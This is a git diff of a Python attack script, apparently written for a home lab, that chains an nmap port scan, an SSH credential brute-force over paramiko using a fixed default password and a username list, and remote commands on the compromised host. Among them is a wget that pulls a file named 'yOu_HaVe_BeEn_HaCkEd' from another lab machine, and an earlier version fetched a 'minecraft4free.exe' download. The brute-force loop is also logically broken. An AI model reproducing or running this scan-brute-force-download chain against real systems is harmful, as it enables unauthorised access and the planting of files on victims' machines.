@@ -9,6 +9,8 @@ import main
 
 
 IpList = []
+SSHlist = []
+usernames = []
 
 
 
@@ -24,29 +26,73 @@ def nmaper():
             results = results['scan'][target]['tcp'][portnum]['state']
             if (results == "open"):
                 print(f'{target} port {portnum} is {results}.')
+                if (portnum == 22):
+                    SSHlist.append(target)
 
         print("-----------------------------------")
     #once all open ports have been found
         
-def ssher():
+def open_file():
+    with open('usernames.txt') as usernamefile:
+            for line in usernamefile:
+                usernames.append(line.rstrip())
+
+
+
+def bruteforce():
+    flag = False
+    open_file()
+    while (flag == False):
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        for target in (SSHlist):
+            for user in usernames:
+                try:
+                    client.connect(target, username=user, password='msfadmin')
+                    flag = True
+                except paramiko.ssh_exception.AuthenticationException:
+                    flag = False
+                except paramiko.ssh_exception.SSHException:
+                    flag = False
+                finally:
+                    ssher(client)
+                    flag = True
+                    break
+            break
+    ##opening file
+
+
+
+
+def ssher(client):
     command = 'ls'
-    command2 = "wget http://192.168.56.101/minecraft4free.exe"
-    #command3 = ""
-    command = "ls"
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    client.connect('192.168.56.103', username='msfadmin', password='msfadmin')
+    command2 = "wget http://192.168.56.101/yOu_HaVe_BeEn_HaCkEd"
+    command3 = "cat yOu_HaVe_BeEn_HaCkEd"
+
+    #client = paramiko.SSHClient()
+    #client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    #for target in (SSHlist):
+        #for user in usernames:
+            #try:
+    #client.connect(target, username=user, password='msfadmin')
+ #               return True
+ #           except paramiko.ssh_exception.AuthenticationException:
+#                return False
     (stdin, stdout, stderr) = client.exec_command(command)
     lines = stdout.readlines()
     print(lines)
     (stdin, stdout, stderr) = client.exec_command(command2)
     lines = stdout.readlines()
     print(lines)
-    (stdin, stdout, stderr) = client.exec_command(command)
+    (stdin, stdout, stderr) = client.exec_command(command3)
     lines = stdout.readlines()
     print(lines)
 
     client.close()
+
+
+
+
 
 def ping():
     ipbase = "192.168.56."
@@ -57,54 +103,3 @@ def ping():
             IpList.append(ip)
 
     os.system('del '+ip)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-def scanner():  
-
-    while startip != endip:
-    
-        ip='.'.join(map(str,startip))
-        threading.Thread(target=ping,args=(ip,)).start()
-        startip[3]+=1
-        if startip[3]%256==0:
-            startip[3]=0
-            if (startip[2]+1)%256==0:
-                startip[2]=0
-                if (startip[1]+1)%256==0:
-                    startip[1]=0
-                    if (startip[0]+1)%256==0:
-                        startip[0]=0
-                    else:
-                        startip[0]+=1
-                else:
-                    startip[1]+=1
-            else:
-                startip[2]+=1
